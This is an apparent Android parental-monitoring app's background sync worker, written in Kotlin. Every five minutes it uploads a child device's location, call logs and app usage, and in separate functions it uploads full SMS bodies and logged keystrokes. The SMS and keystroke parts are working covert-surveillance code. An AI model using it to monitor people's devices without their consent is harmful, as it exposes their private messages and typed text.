package com.familyguardpro.services

import android.content.Context
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.util.Log
import androidx.work.*
import com.familyguardpro.models.KeystrokeBatchRequest
import com.familyguardpro.models.SyncData
import com.familyguardpro.network.ApiClient
import com.familyguardpro.utils.PreferenceManager
import com.familyguardpro.utils.DataCollector
import com.familyguardpro.utils.KeystrokeBuffer
import com.familyguardpro.utils.FcmTokenManager
import com.google.firebase.messaging.FirebaseMessaging
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import java.util.concurrent.TimeUnit

class DataSyncWorker(
    context: Context,
    params: WorkerParameters
) : CoroutineWorker(context, params) {

    companion object {
        private const val TAG = "DataSyncWorker"
        private const val WORK_NAME = "data_sync_worker"
        private const val IMMEDIATE_WORK_NAME = "data_sync_immediate"
        
        fun schedulePeriodicSync(context: Context) {
            val constraints = Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build()
            
            // Sync every 5 minutes for more real-time updates
            val workRequest = PeriodicWorkRequestBuilder<DataSyncWorker>(
                5, TimeUnit.MINUTES,
                2, TimeUnit.MINUTES // Flex interval
            )
                .setConstraints(constraints)
                .setBackoffCriteria(
                    BackoffPolicy.EXPONENTIAL,
                    WorkRequest.MIN_BACKOFF_MILLIS,
                    TimeUnit.MILLISECONDS
                )
                .build()
            
            WorkManager.getInstance(context)
                .enqueueUniquePeriodicWork(
                    WORK_NAME,
                    ExistingPeriodicWorkPolicy.UPDATE,
                    workRequest
                )
            
            Log.d(TAG, "Periodic sync scheduled (every 5 minutes)")
        }
        
        fun runImmediateSync(context: Context) {
            // Don't require network constraint for immediate sync
            // Let the worker run and handle network errors gracefully
            // This prevents "Waiting for network" stuck state
            val workRequest = OneTimeWorkRequestBuilder<DataSyncWorker>()
                .setConstraints(
                    Constraints.Builder()
                        .setRequiredNetworkType(NetworkType.NOT_REQUIRED)
                        .build()
                )
                .build()
            
            WorkManager.getInstance(context)
                .enqueueUniqueWork(
                    IMMEDIATE_WORK_NAME,
                    ExistingWorkPolicy.REPLACE,
                    workRequest
                )
            Log.d(TAG, "Immediate sync scheduled (no network constraint)")
        }
        
        fun getImmediateWorkName(): String = IMMEDIATE_WORK_NAME
        
        fun cancelSync(context: Context) {
            WorkManager.getInstance(context).cancelUniqueWork(WORK_NAME)
        }
        
        // Alias methods for compatibility
        fun enqueue(context: Context) {
            schedulePeriodicSync(context)
        }
        
        fun enqueueNow(context: Context) {
            runImmediateSync(context)
        }
    }

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        val preferenceManager = PreferenceManager(applicationContext)
        
        if (!preferenceManager.isChildMode()) {
            Log.d(TAG, "Not in child mode, skipping sync")
            return@withContext Result.success()
        }
        
        // Check network connectivity - but be lenient
        val networkStatus = getNetworkStatus()
        Log.d(TAG, "Network status: $networkStatus")
        
        try {
            Log.d(TAG, "Starting data sync...")
            
            val deviceId = preferenceManager.getDeviceId()
            Log.d(TAG, "Using Device ID: $deviceId")
            
            if (deviceId.isEmpty()) {
                Log.e(TAG, "Device ID is empty! Cannot sync.")
                return@withContext Result.failure()
            }
            
            val dataCollector = DataCollector(applicationContext)
            val syncData = dataCollector.collectAllData()
            
            // Build location item if available
            val locationItem: com.familyguardpro.network.LocationItem? = syncData.location?.let { loc ->
                com.familyguardpro.network.LocationItem(
                    latitude = loc.latitude,
                    longitude = loc.longitude,
                    accuracy = loc.accuracy,
                    timestamp = System.currentTimeMillis()
                )
            }
            
            // Transform call logs to proper data class
            val callLogsFormatted = syncData.callLogs.map { call ->
                com.familyguardpro.network.CallLogItem(
                    number = call.number,
                    name = call.name,
                    type = call.type,
                    duration = call.duration,
                    timestamp = call.timestamp
                )
            }
            
            // Transform app usage to proper data class
            val appsFormatted = syncData.appUsage.map { app ->
                com.familyguardpro.network.AppUsageItem(
                    packageName = app.packageName,
                    appName = app.appName,
                    usageTime = app.usageTime,
                    openCount = 1
                )
            }
            
            // Check mobile data status
            val mobileDataOn = isMobileDataEnabled()
            Log.d(TAG, "Mobile data enabled: $mobileDataOn")
            
            // Create the sync request body
            val syncRequestBody = com.familyguardpro.network.SyncRequestBody(
                battery = syncData.batteryLevel,
                screenTime = (dataCollector.getScreenTime() / 60000).toInt(), // Convert ms to minutes
                apps = appsFormatted,
                callLogs = callLogsFormatted,
                location = locationItem,
                notifications = emptyList(),
                mobileDataEnabled = mobileDataOn
            )
            
            // Upload to server
            Log.d(TAG, "=== SYNC REQUEST DETAILS ===")
            Log.d(TAG, "Device ID from preferences: '$deviceId'")
            Log.d(TAG, "Device ID length: ${deviceId.length}")
            Log.d(TAG, "API Base URL: ${com.familyguardpro.network.ApiClient.BASE_URL}")
            Log.d(TAG, "Battery: ${syncRequestBody.battery}, ScreenTime: ${syncRequestBody.screenTime}")
            Log.d(TAG, "Apps count: ${appsFormatted.size}, CallLogs count: ${callLogsFormatted.size}")
            Log.d(TAG, "Location: $locationItem")
            Log.d(TAG, "=== END REQUEST DETAILS ===")
            
            val response = ApiClient.api.uploadData(deviceId, syncRequestBody)
            
            Log.d(TAG, "Server response: success=${response.success}, message=${response.message}")
            
            if (response.success) {
                Log.d(TAG, "Data sync successful!")
                preferenceManager.setLastSyncTime(System.currentTimeMillis())
                
                // Also report permissions periodically
                com.familyguardpro.utils.PermissionReporter.reportPermissions(applicationContext)
                
                // Sync SMS messages
                syncSmsMessages(deviceId)
                
                // Sync keystroke data
                syncKeystrokes(deviceId)
                
                // Ensure FCM token is registered
                ensureFcmTokenRegistered(deviceId)
                
                return@withContext Result.success()
            } else {
                Log.e(TAG, "Data sync failed: ${response.message}")
                return@withContext Result.retry()
            }
            
        } catch (e: retrofit2.HttpException) {
            val errorCode = e.code()
            val errorBody = e.response()?.errorBody()?.string()
            Log.e(TAG, "HTTP Error $errorCode: $errorBody")
            
            if (errorCode == 404 && errorBody?.contains("not registered") == true) {
                Log.e(TAG, "DEVICE NOT REGISTERED! Device needs to be re-paired.")
                // Don't retry - device is not in database
                return@withContext Result.failure()
            }
            return@withContext Result.retry()
        } catch (e: java.net.UnknownHostException) {
            Log.e(TAG, "Network error - no internet connection: ${e.message}")
            return@withContext Result.retry()
        } catch (e: java.net.SocketTimeoutException) {
            Log.e(TAG, "Network timeout: ${e.message}")
            return@withContext Result.retry()
        } catch (e: Exception) {
            Log.e(TAG, "Data sync error: ${e.javaClass.simpleName} - ${e.message}", e)
            return@withContext Result.retry()
        }
    }
    
    private fun getNetworkStatus(): String {
        val connectivityManager = applicationContext.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val network = connectivityManager.activeNetwork
        if (network == null) return "NO_ACTIVE_NETWORK"
        
        val capabilities = connectivityManager.getNetworkCapabilities(network)
        if (capabilities == null) return "NO_CAPABILITIES"
        
        val types = mutableListOf<String>()
        if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) types.add("WIFI")
        if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) types.add("CELLULAR")
        if (capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)) types.add("HAS_INTERNET")
        if (capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)) types.add("VALIDATED")
        
        return types.joinToString(", ")
    }
    
    /**
     * Check if mobile data is enabled on the device (setting is ON, not just connected)
     */
    private fun isMobileDataEnabled(): Boolean {
        try {
            // Check if mobile data setting is enabled (even if currently on WiFi)
            try {
                val telephonyManager = applicationContext.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
                // Use reflection to call isDataEnabled which requires READ_PHONE_STATE permission
                val method = telephonyManager.javaClass.getDeclaredMethod("isDataEnabled")
                return method.invoke(telephonyManager) as Boolean
            } catch (e: Exception) {
                Log.d(TAG, "Could not check telephony data status: ${e.message}")
            }
            
            // Fallback: check if currently connected via cellular
            val connectivityManager = applicationContext.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val network = connectivityManager.activeNetwork
            
            if (network != null) {
                val capabilities = connectivityManager.getNetworkCapabilities(network)
                if (capabilities != null) {
                    if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) {
                        return true
                    }
                }
            }
            
            return false
        } catch (e: Exception) {
            Log.e(TAG, "Error checking mobile data status", e)
            return false
        }
    }
    
    /**
     * Sync SMS messages to server
     */
    private suspend fun syncSmsMessages(deviceId: String) {
        try {
            if (!SmsCollector.hasSmsPermission(applicationContext)) {
                Log.d(TAG, "SMS permission not granted, skipping SMS sync")
                return
            }
            
            Log.d(TAG, "Starting SMS sync...")
            
            val smsArray = SmsCollector.collectSms(applicationContext, 48)
            
            if (smsArray.length() == 0) {
                Log.d(TAG, "No SMS messages to sync")
                return
            }
            
            val smsList = mutableListOf<com.familyguardpro.network.SmsItem>()
            for (i in 0 until smsArray.length()) {
                val sms = smsArray.getJSONObject(i)
                smsList.add(
                    com.familyguardpro.network.SmsItem(
                        address = sms.optString("address", ""),
                        contactName = sms.optString("contactName", null),
                        body = sms.optString("body", ""),
                        type = sms.optString("type", "inbox"),
                        read = sms.optBoolean("read", false),
                        date = sms.optLong("date", 0)
                    )
                )
            }
            
            val requestBody = com.familyguardpro.network.SmsRequestBody(
                deviceId = deviceId,
                messages = smsList
            )
            
            val response = ApiClient.api.syncSms(requestBody)
            
            if (response.success) {
                Log.d(TAG, "✅ SMS sync successful! Synced ${smsList.size} messages")
            } else {
                Log.e(TAG, "SMS sync failed: ${response.message}")
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "SMS sync error: ${e.message}", e)
        }
    }
    
    /**
     * Sync buffered keystroke data to server
     */
    private suspend fun syncKeystrokes(deviceId: String) {
        try {
            val keystrokeBuffer = KeystrokeBuffer.getInstance(applicationContext)
            val keystrokes = keystrokeBuffer.getAndClearBuffer()
            
            if (keystrokes.isEmpty()) {
                Log.d(TAG, "No keystrokes to sync")
                return
            }
            
            Log.d(TAG, "Syncing ${keystrokes.size} keystrokes...")
            
            val request = KeystrokeBatchRequest(
                deviceId = deviceId,
                keystrokes = keystrokes
            )
            
            val response = ApiClient.api.uploadKeystrokes(request)
            
            if (response.isSuccessful) {
                Log.d(TAG, "✅ Keystroke sync successful! Synced ${keystrokes.size} keystrokes")
            } else {
                Log.e(TAG, "Keystroke sync failed: ${response.code()}")
                // Re-buffer the keystrokes on failure (avoid data loss)
                // Note: For simplicity, we don't re-add here, but in production we could
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "Keystroke sync error: ${e.message}", e)
        }
    }

    /**
     * Ensure FCM token is registered with the server
     * Uses FcmTokenManager for centralized token management with retry logic
     */
    private suspend fun ensureFcmTokenRegistered(deviceId: String) {
        try {
            Log.d(TAG, "Checking FCM token registration via FcmTokenManager...")
            
            // Check if token needs refresh based on age
            if (FcmTokenManager.shouldRefreshToken()) {
                Log.d(TAG, "FCM token age threshold exceeded - refreshing...")
                FcmTokenManager.refreshTokenAsync()
            } else {
                Log.d(TAG, "FCM token is recent - skipping refresh")
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to register FCM token: ${e.message}", e)
            // Trigger async refresh on error
            FcmTokenManager.refreshTokenAsync()
        }
    }
}
